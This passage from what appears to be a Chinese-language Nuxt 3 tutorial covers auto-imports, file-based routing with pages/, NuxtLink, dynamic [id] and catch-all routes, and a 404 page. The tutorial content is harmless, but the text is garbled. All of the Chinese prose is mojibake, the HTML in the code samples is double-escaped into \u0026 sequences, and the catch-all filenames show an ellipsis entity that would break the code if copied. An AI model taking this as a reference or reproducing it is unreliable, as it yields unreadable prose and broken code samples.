items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨ app.vue æª”æ¡ˆä¸­ï¼Œæ–°å¢ \u0026lt;IronManWelcome /\u0026gt; å…ƒä»¶ã€‚\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ç¾åœ¨ï¼Œç€è¦½å™¨å¯ä»¥çœ‹è¦‹æˆ‘å€‘æ·»åŠ çš„å…ƒä»¶æ•ˆæœã€‚\nå¯ä»¥ç™¼ç¾ï¼Œæˆ‘å€‘ä¸éœ€è¦æ·»åŠ  import IronManWelcome from './components/IronManWelcome' å°±å¯ä»¥ç›´æ¥åœ¨ template ç›´æ¥ä½¿ç”¨ \u0026lt;IronManWelcome /\u0026gt; å…ƒä»¶ï¼Œé€™å°±æ˜¯ Nuxt 3 åŸºæ–¼ç›®éŒ„çš„è‡ªå‹•è¼‰å…¥åŠŸèƒ½ã€‚\né—œé–‰è‡ªå‹•è¼‰å…¥ å¦‚æœæƒ³é—œé–‰ Nuxt çš„è‡ªå‹•è¼‰å…¥å…ƒä»¶æˆ–å‡½æ•¸çš„åŠŸèƒ½ï¼Œå¯ä»¥ä¿®æ”¹å°ˆæ¡ˆç›®éŒ„ä¸‹çš„ nuxt.config.ts æª”æ¡ˆï¼Œå°‡ imports.autoImport è¨­å®šç‚º falseã€‚\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ imports: { autoImport: false } }) é¡¯å¼è¼‰å…¥ (Explicit Imports) Explicit (é¡¯å¼ã€æ˜ç¢ºçš„)ï¼Œç•¶æˆ‘å€‘éœ€è¦æ‰‹å‹•è¼‰å…¥ï¼Œå°±å¯ä»¥ç”¨ #import é€™å€‹ Nuxt é‡‹å‡ºçš„åˆ¥åï¼Œä¾†å€‹åˆ¥è¼‰å…¥é‚£äº›å…·æœ‰è‡ªå‹•è¼‰å…¥çš„å…ƒä»¶æˆ–å‡½æ•¸ã€‚\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; import { ref, computed } from \u0026#39;#imports\u0026#39; const count = ref(1) const double = computed(() =\u0026gt; count.value * 2) \u0026lt;/script\u0026gt; Nuxt 3 çš„å°ˆæ¡ˆç›®éŒ„èˆ‡çµæ§‹å·²ç¶“æœ‰ä¸€å€‹è¦å®šå¯ä»¥éµå®ˆï¼ŒNuxt 3 è¦åŠƒçš„ç›®éŒ„åŠæª”æ¡ˆæ¶æ§‹ï¼Œè®“æˆ‘å€‘å¯ä»¥ä¸ç”¨å†ç…©æƒ±è©²å¦‚ä½•é…ç½®ï¼Œåªéœ€è¦å°ˆæ³¨é–‹ç™¼ï¼Œç•¶ä½ ç†Ÿæ‚‰é€™äº›ç›®éŒ„æª”æ¡ˆè¦å‰‡èˆ‡è‡ªå‹•è¼‰å…¥çš„ç‰¹æ€§ï¼Œè‚¯å®šèƒ½æ›´å¿«ä¸Šæ‰‹ Nuxt 3ã€‚\né é¢ (Pages) èˆ‡è·¯ç”± (Routing) åœ¨ Vue ä¸­ï¼Œæˆ‘å€‘æœƒä½¿ç”¨åˆ° Vue Router ä¾†å¯¦ç¾åˆ‡æ›é é¢æˆ–è·¯ç”±çš„éœ€æ±‚ï¼Œè€Œåœ¨ Nuxt 3 ä¸­ï¼Œé è¨­æ˜¯æ²’æœ‰ä½¿ç”¨è·¯ç”±ç›¸é—œå¥—ä»¶ï¼Œç›´è‡³å»ºç«‹äº† pages ç›®éŒ„ï¼ŒNuxt å°‡æœƒè‡ªå‹•è¼‰å…¥ Vue Router ä¾†ç®¡ç†è·¯ç”±ï¼Œä¸¦ä¸”å…·æœ‰ä¸€å®šçš„è¦å‰‡éœ€è¦éµå¾ªï¼Œä»¥ä¸‹å°‡ä»‹ç´¹é é¢ç›®éŒ„èˆ‡è·¯ç”±ä¹‹é–“çš„é—œä¿‚ã€‚\nåŸºæ–¼æª”æ¡ˆçš„è·¯ç”± (File-based Routing) åœ¨ Nuxt 3 å°ˆæ¡ˆçš„ pages ç›®éŒ„ä¸‹ï¼Œç•¶æˆ‘å€‘å»ºç«‹äº†ä¸€å€‹é é¢æª”æ¡ˆï¼Œå°±æœƒä»¥è©²æª”æ¡ˆå»ºç«‹å‡ºç›¸å°æ‡‰çš„è·¯ç”±ï¼ŒNuxt 3 åŸºæ–¼æª”æ¡ˆçš„è·¯ç”±ï¼Œä¹Ÿä½¿ç”¨äº†ç¨‹å¼ç¢¼æ‹†åˆ†å°‡æ¯å€‹é é¢éœ€è¦çš„ç¨‹å¼ç¢¼æ¢³ç†å‡ºä¾†ï¼Œä¸¦ä»¥å‹•æ…‹è¼‰å…¥çš„æ–¹å¼è¼‰å…¥æœ€å°æ‰€éœ€è¦çš„ç¨‹å¼ç¢¼ã€‚å› ç‚ºæ˜¯ä»¥ç›®éŒ„çµæ§‹èˆ‡æª”æ¡ˆå‘½åæ–¹å¼ä¾†ç´„å®šï¼Œä¹Ÿç¨±ä¹‹ç‚ºç´„å®šå¼è·¯ç”±ã€‚\nå»ºç«‹ç¬¬ä¸€å€‹é é¢ Nuxt 3 çš„ pages ç›®éŒ„ï¼Œæ˜¯ç”¨ä¾†å»ºç«‹é é¢ä¸¦æ”¾ç½®çš„ç›®éŒ„ï¼Œç•¶å°ˆæ¡ˆä¸‹æœ‰å­˜åœ¨ pages ç›®éŒ„ï¼ŒNuxt å°‡æœƒè‡ªå‹•è¼‰å…¥ Vue Router ä¾†å¯¦ç¾è·¯ç”±æ•ˆæœï¼Œç›®éŒ„ä¸‹çš„æª”æ¡ˆé€šå¸¸æ˜¯ Vue çš„å…ƒä»¶ï¼Œä¹Ÿå…è¨±å…·æœ‰ .vueã€.jsã€.jsxã€.ts æˆ– .tsx å‰¯æª”åçš„æª”æ¡ˆã€‚\nç•¶æˆ‘å€‘å»ºç«‹ ./pages/index.vueï¼Œæª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼Œå‰‡è¡¨ç¤ºè·¯ç”± / å°æ‡‰åˆ°é€™å€‹é é¢æª”æ¡ˆï¼Œæˆ‘å€‘åªéœ€è¦å»ºç«‹æª”æ¡ˆï¼Œè·¯ç”±çš„é…ç½®å°‡æœƒç”± Nuxt 3 è‡ªå‹•ç”¢ç”Ÿã€‚\npages/index.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;é€™è£¡æ˜¯é¦–é \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; è‹¥ä½ é‚„è¨˜å¾— Vue Router ä¸­çš„ \u0026lt;router-view /\u0026gt;ï¼Œé€™æ˜¯è·¯ç”±éœ€è¦çš„é€²å…¥é»ï¼ŒåŒæ¨£çš„åœ¨ Nuxt 3 æˆ‘å€‘éœ€è¦ä½¿ç”¨ \u0026lt;NuxtPage /\u0026gt; ä¾†é¡¯ç¤ºæˆ‘å€‘å»ºç«‹çš„è·¯ç”±é é¢ï¼Œé€™è£¡éå¸¸é‡è¦ï¼Œå¦å‰‡è·¯ç”±åŠé é¢å°‡ç„¡æ³•æ­£ç¢ºé‹ä½œã€‚\nä¿®æ”¹ ./app.vueï¼Œæª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æ¥è‘—æˆ‘å€‘åœ¨ç€è¦½å™¨ç€è¦½ / è·¯ç”±ï¼Œå¦‚ http://localhost:3000/ï¼Œå°±å¯ä»¥çœ‹åˆ°æˆ‘å€‘åœ¨ ./pages/index.vue é é¢å…§å¯«çš„æ¨™é¡Œæ–‡å­—ã€Œé€™æ˜¯é¦–é ã€å›‰ï¼\nå¤šå€‹è·¯ç”±é é¢ åœ¨å¯¦å‹™ä¸Šï¼Œé€šå¸¸ä¸€å€‹ç¶²ç«™æœƒæœ‰å¤šå€‹é é¢ï¼Œä¸¦åˆ†åˆ¥å°æ‡‰åˆ°ä¸åŒçš„è·¯ç”±ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å˜—è©¦å»ºç«‹ About èˆ‡ Contact å…©å€‹é é¢ã€‚\nå»ºç«‹å¤šå€‹è·¯ç”±é é¢ å»ºç«‹ ./pages/about.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/about.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-yellow-400\u0026#34;\u0026gt;å¤§å®¶å¥½ï¼æˆ‘æ˜¯ Ryan\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;é€™è£¡æ˜¯ /about\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å»ºç«‹ ./pages/contact.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/contact.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-rose-400\u0026#34;\u0026gt;å¦‚æœæ²’äº‹ä¸è¦æ‰¾æˆ‘ xDDD\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;é€™è£¡æ˜¯ /contact\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æ¥è‘—æˆ‘å€‘åœ¨ç€è¦½å™¨åˆ†åˆ¥ç€è¦½ /about æˆ– /contactï¼Œå°±å¯ä»¥çœ‹åˆ°æˆ‘å€‘è·¯ç”±æ•ˆæœå›‰ï¼\nå¯ä»¥ç™¼ç¾æ‰€å»ºç«‹çš„æª”æ¡ˆåç¨±ï¼Œæœ€çµ‚å°±æœƒè‡ªå‹•å°æ‡‰ç”¢ç”Ÿå‡º /about åŠ /contact è·¯ç”±ã€‚\nè‡ªå‹•ç”¢ç”Ÿçš„è·¯ç”± å¦‚æœä½ æœ‰èˆˆè¶£æƒ³çœ‹çœ‹ Nuxt è‡ªå‹•ç”¢ç”Ÿå‡ºä¾†çš„è·¯ç”±é…ç½®é•·ä»€éº¼æ¨£å­ï¼Œå¯ä»¥ä½¿ç”¨ npm run build æˆ– npx nuxt build ä¾†å»ºæ§‹å‡º .output ç›®éŒ„ï¼Œä¸¦æ‰“é–‹ .output/server/chunks/app/server.mjsï¼Œæœå°‹ const _routes = æˆ–å‰›å‰›å»ºç«‹çš„æª”æ¡ˆåç¨± about.vueï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸‹é¢é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼š\né€™æ®µç¨‹å¼ç¢¼èˆ‡ Vue ä¸­çš„è·¯ç”±é…ç½®éå¸¸ç›¸åƒï¼Œå…¶å¯¦é€™å°±æ˜¯ Nuxt 3 æª¢æ¸¬åˆ° pages ç›®éŒ„ï¼Œè‡ªå‹•å¹«æˆ‘å€‘è¼‰å…¥ Vue Router èˆ‡ä¾æ“š pages ç›®éŒ„ä¸‹çš„æª”æ¡ˆçµæ§‹ï¼Œè‡ªå‹•ç”¢ç”Ÿå‡ºæ‰€éœ€çš„è·¯ç”±é…ç½®ã€‚\nå»ºç«‹è·¯ç”±é€£çµ åœ¨ Vue Router æˆ‘å€‘å¯ä»¥ä½¿ç”¨ \u0026lt;router-link\u0026gt; ä¾†å»ºç«‹è·¯ç”±é€£çµï¼Œä»¥æ­¤ä¾†å°èˆªè‡³å…¶ä»–é é¢ï¼Œè€Œåœ¨ Nuxt 3 çš„è·¯ç”±ä¸­ï¼Œå‰‡æ˜¯ä½¿ç”¨ \u0026lt;NuxtLink\u0026gt; ä¾†å»ºç«‹è·¯ç”±é€£çµä¾†é€²è¡Œé é¢çš„è·³è½‰ï¼Œæˆ‘å€‘å˜—è©¦åœ¨é¦–é æ–°å¢å¹¾å€‹è·¯ç”±é€£çµä¾†é€²è¡Œé é¢å°èˆªã€‚\nèª¿æ•´ ./pages/index.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;é€™è£¡æ˜¯é¦–é \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/about\u0026#34;\u0026gt;å‰å¾€ About\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/contact\u0026#34;\u0026gt;å‰å¾€ Contact\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æ¥è‘—æˆ‘å€‘åœ¨ç€è¦½å™¨ç€è¦½é¦–é ï¼Œé»æ“Šã€Œå‰å¾€ Aboutã€æˆ–ã€Œå‰å¾€ Contactã€å°±å¯ä»¥çœ‹è¦‹è·¯ç”±å°èˆªæ•ˆæœå›‰ï¼\nä½¿ç”¨ \u0026lt;NuxtLink\u0026gt; æ™‚ï¼Œå¯ä»¥å°±æŠŠå®ƒæƒ³åƒç‚º \u0026lt;router-link\u0026gt; çš„æ›¿ä»£å“ï¼Œåƒ to é€™å€‹ Pros æ§åˆ¶è·¯ç”±ä½ç½®çš„ç”¨æ³•åŸºæœ¬ä¸Šä¸€æ¨£ï¼Œå…¶ä»–æ›´å¤šçš„ Pros ç”¨æ³•åŠèªªæ˜å¯ä»¥åƒè€ƒå®˜ç¶²çš„æ–‡ä»¶ã€‚\nå¦‚æœæƒ³è¦ä½¿ç”¨åƒ Vue Router æä¾›çš„ router.push æ–¹æ³•æ–¼ Vue ä¸­ç›´æ¥å‘¼å«ä¾†å°èˆªè‡³å…¶ä»–é é¢ï¼Œåœ¨ Nuxt ä¸­ä½ å¯ä»¥ä½¿ç”¨ navigateToï¼Œåƒæ•¸å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚\nç´„å®šå¼è·¯ç”±ä¸­çš„ index.vue åœ¨é–‹é ­æœ‰æåˆ°ï¼ŒNuxt 3 æä¾›äº†ä¸€å€‹åŸºæ–¼æª”æ¡ˆçš„è·¯ç”±ï¼Œå¾ä¸Šè¿°ä¾‹å­ä½ æˆ–è¨±èƒ½ç™¼ç¾ï¼ŒåŸºæœ¬ä¸Šæª”æ¡ˆåç¨±å°±æ˜¯å°æ‡‰è‘—è·¯ç”±åç¨±ï¼Œä½† index.vue æ¯”è¼ƒç‰¹åˆ¥ï¼Œå®ƒæ‰€å°æ‡‰çš„æ˜¯è·¯ç”± /ã€‚\nindex.[ext] é€™å€‹æ•ˆæœå’Œç‰¹æ€§ï¼Œå…¶å¯¦æ˜¯èˆ‡ Node.js åº•å±¤æ ¸å¿ƒæœ‰é—œï¼Œåœ¨æ­¤å°±ä¸è´…è¿°ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å¯ä»¥åœ¨ pages ä¸‹å»ºç«‹ä¸€å€‹ docs.vue è¡¨ç¤ºå°æ‡‰è·¯ç”± /docsï¼Œä¹Ÿå¯ä»¥å°‡æª”æ¡ˆæ”¾ç½®åœ¨ docs ç›®éŒ„ä¸‹ä¸¦é‡æ–°å‘½åç‚º index.vue å³ ./pages/docs/index.vueï¼Œé€™æ¨£ä¹Ÿå¯ä»¥é€é /docs ç€è¦½åˆ°ç›¸åŒçš„é é¢ã€‚\næ‰€ä»¥ç•¶ index.vue å­˜åœ¨æ–¼ pages ç›®éŒ„ä¸‹ï¼Œå·²ç¶“ä½æ–¼ç¶²ç«™é é¢çš„ç¬¬ä¸€å±¤ï¼Œæ‰€ä»¥æˆ‘å€‘ç€è¦½ http://localhost:3000/ å°±å¯ä»¥åšå‡ºé¦–é çš„æ•ˆæœã€‚\nå¸¶åƒæ•¸çš„å‹•æ…‹è·¯ç”±åŒ¹é… åœ¨å¯¦å‹™ä¸Šï¼Œæˆ‘å€‘å¯èƒ½éœ€è¦å°‡è·¯å¾‘ä½œç‚ºåƒæ•¸å‚³éçµ¦åŒä¸€å€‹å…ƒä»¶ï¼Œä¾‹å¦‚ï¼Œæˆ‘å€‘æœ‰ä¸€å€‹ users é é¢å…ƒä»¶ï¼Œåœ¨ /users/ryan æˆ– /users/jennifer è·¯å¾‘ï¼Œéƒ½èƒ½åŒ¹é…åˆ°åŒä¸€å€‹ users å…ƒä»¶ï¼Œä¸¦å°‡ ryan æˆ– jennifer ç•¶ä½œåƒæ•¸å‚³éçµ¦ users é é¢å…ƒä»¶ä½¿ç”¨ï¼Œé‚£éº¼æˆ‘å€‘å°±éœ€è¦å‹•æ…‹è·¯ç”±ä¾†åšåˆ°é€™ä»¶äº‹ã€‚\nåœ¨ Vue 3 ä½¿ç”¨ Vue Router æˆ‘å€‘å¯èƒ½æœƒå¯«å‡ºå¦‚ä¸‹è·¯ç”±é…ç½®ï¼š\n1 2 3 4 5 { name: \u0026#34;users\u0026#34;, path: \u0026#34;/users/:id\u0026#34;, component: \u0026#34;./pages/users.vue\u0026#34;, } é€™æ¨£æˆ‘å€‘å°±èƒ½é”åˆ°é€²å…¥ /users/ryan è·¯ç”±å°‡ ryan ç•¶ä½œ id åƒæ•¸å‚³å…¥ users å…ƒä»¶ä¸­ï¼Œè·¯å¾‘åƒæ•¸ç”¨å†’è™Ÿ : è¡¨ç¤ºï¼Œé€™å€‹è¢«åŒ¹é…çš„åƒæ•¸ (params)ï¼Œæœƒåœ¨å…ƒä»¶ä¸­å¯ä»¥ä½¿ç”¨ useRoute() èˆ‡ route.params.id å–å¾—ã€‚\nåœ¨ Nuxt 3 ä¸­ï¼Œæˆ‘å€‘è¦å¯¦ç¾é€™å€‹æ•ˆæœï¼Œéœ€è¦å°‡æª”æ¡ˆåç¨±æ·»åŠ ä¸­æ‹¬è™Ÿ []ï¼Œå…¶ä¸­æ”¾å…¥æ¬²è¨­å®šçš„åƒæ•¸åç¨±ï¼Œè­¬å¦‚ä¸‹é¢çš„ç›®éŒ„çµæ§‹èˆ‡æª”æ¡ˆåç¨±ã€‚\n1 2 3 ./pages/ â””â”€â”€ users/ â””â”€â”€ [id].vue å»ºç«‹ ./pages/users/[id].vue æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/users/[id].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;é€™è£¡æ˜¯ Users å‹•æ…‹è·¯ç”±é é¢\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; åŒ¹é…åˆ°çš„ Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ id }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { id } = route.params \u0026lt;/script\u0026gt; æˆ‘å€‘åœ¨ script å°±å¯ä»¥å¾ route.params æ‹¿åˆ°æˆ‘å€‘æ‰€è¨­å®šçš„åƒæ•¸åç¨± idï¼Œä¸¦å°‡å…¶åœ¨ template ä¸­æ¸²æŸ“å‡ºä¾†ã€‚ç€è¦½ http://localhost:3000/users/ryan ï¼Œçœ‹çœ‹æ•ˆæœï¼ŒNuxt 3 å°±èƒ½åŒ¹é…åˆ°ä½¿ç”¨è€…çš„ id åƒæ•¸ ryanï¼Œä¸¦å‚³å…¥ users é é¢å…ƒä»¶ã€‚\nä½ ä¹Ÿå¯ä»¥åœ¨ template ç›´æ¥ä½¿ç”¨ {{ $route.params.id }} ä¾†æ¸²æŸ“å‡º id åƒæ•¸ã€‚\nåŒ¹é…æ‰€æœ‰å±¤ç´šçš„è·¯ç”± å¦‚æœä½ éœ€è¦åŒ¹é…æŸå€‹é é¢ä¸‹çš„æ‰€æœ‰å±¤ç´šçš„è·¯ç”±ï¼Œä½ å¯ä»¥åœ¨åƒæ•¸å‰é¢åŠ ä¸Š ... ï¼Œä¾‹å¦‚ï¼Œ[...slug].vueï¼Œé€™å°‡åŒ¹é…è©²è·¯å¾‘ä¸‹çš„æ‰€æœ‰è·¯ç”±ã€‚\nå»ºç«‹ ./catch-all/[\u0026hellip;slug].vue æª”æ¡ˆï¼š\n1 2 3 ./pages/ â””â”€â”€ catch-all/ â””â”€â”€ [...slug].vue ./catch-all/[\u0026hellip;slug].vue æª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼š\ncatch-all/[\u0026hellip;slug].vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-4xl text-gray-800\u0026#34;\u0026gt;é€™æ˜¯ catch-all/... ä¸‹çš„é é¢\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-8 text-3xl text-gray-600\u0026#34;\u0026gt;åŒ¹é…åˆ°çš„ Params:\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-4 text-5xl font-semibold text-violet-500\u0026#34;\u0026gt;{{ $route.params.slug }}\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;text-xl text-gray-400\u0026#34;\u0026gt;æ¯å€‹é™£åˆ—å…ƒç´ å°æ‡‰ä¸€å€‹å±¤ç´š\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æˆ‘å€‘å¯ä»¥è¼¸å…¥ /catch-all/hello åŠ /catch-all/hello/worldï¼Œè·¯ç”±çš„åƒæ•¸ slug å°±æœƒæ˜¯ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—çš„æ¯å€‹å…ƒç´ å°æ‡‰æ¯ä¸€å€‹å±¤ç´šã€‚\nå»ºç«‹ 404 Not Found é é¢ Nuxt 3 æä¾›ä¸€å€‹é…ç½®ä¾†è™•ç† 404 Not Found çš„é é¢ï¼Œç•¶æˆ‘å€‘å»ºç«‹ ./pages/[\u0026hellip;slug].vue é é¢ï¼Œ Nuxt 3 æ‰€æœ‰æœªåŒ¹é…çš„è·¯ç”±ï¼Œå°‡æœƒäº¤ç”±é€™å€‹é é¢å…ƒä»¶åšè™•ç†ï¼Œä¸¦åŒæ™‚ä½¿ç”¨ setResponseStatus(404) å‡½æ•¸è¨­å®š 404 HTTP Status Codeã€‚\npages/[\u0026hellip;slug].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-8xl font-semibold text-red-500\u0026#34;\u0026gt;404\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-800\u0026#34;\u0026gt;Not Found\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-xl text-gray-800\u0026#34;\u0026gt;çœŸçš„æ˜¯æ‰¾ä¸åˆ°é€™å€‹é é¢å•¦ \u0026gt;///\u0026lt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; setResponseStatus(404) \u0026lt;/script\u0026gt; /omg é€™å€‹æ˜¯ä¸å­˜åœ¨çš„é é¢ï¼ŒæœªåŒ¹é…çš„è·¯ç”±å°±æœƒäº¤ç”± ./pages/[\u0026hellip;slug].vue é é¢ä¾†è™•ç†ã€‚\nå»ºç«‹å¤šå±¤çš„ç›®éŒ„çµæ§‹ å¦‚æœç†è§£äº†å‹•æ…‹è·¯ç”±çš„ä¸­æ‹¬è™Ÿ [] ç”¨æ³•ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥å»ºç«‹æ›´è¤‡é›œçš„é é¢ç›®éŒ„çµæ§‹ï¼š\n1 2 3 4 5 6 7 8 ./pages/ â””â”€â”€ posts/ â”œâ”€â”€ [postId]/ â”‚ â”œâ”€â”€ comments/ â”‚ â”‚ â””â”€â”€ [commentId].vue â”‚ â””â”€â”€ index.vue â”œâ”€â”€ index.vue â””â”€â”€ top-[number].vue é€™å››å€‹ Vue é é¢çš„åƒè€ƒç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\npages/posts/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-4xl text-gray-600\u0026#34;\u0026gt;é€™æ˜¯ Posts é¦–é \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/8\u0026#34;\u0026gt; å‰å¾€æŒ‡å®šçš„æ–‡ç«  \u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/8/comments/1\u0026#34;\u0026gt;å‰å¾€æŒ‡å®šçš„æ–‡ç« ç•™è¨€\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/top-3\u0026#34;\u0026gt;å‰å¾€ Top 3\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/top-10\u0026#34;\u0026gt;å‰å¾€ Top 10\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/posts/top-[number].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;é€™æ˜¯ posts/top-[number] çš„é é¢\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; åŒ¹é…åˆ°çš„ Top Number: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-rose-500\u0026#34;\u0026gt;{{ number }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { number } = route.params \u0026lt;/script\u0026gt; pages/posts/[postId]/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;é€™æ˜¯ posts/[postId] çš„é é¢\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; åŒ¹é…åˆ°çš„ Post Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ postId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { postId } = route.params \u0026lt;/script\u0026gt; pages/posts/[postId]/comments/[commentId].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl 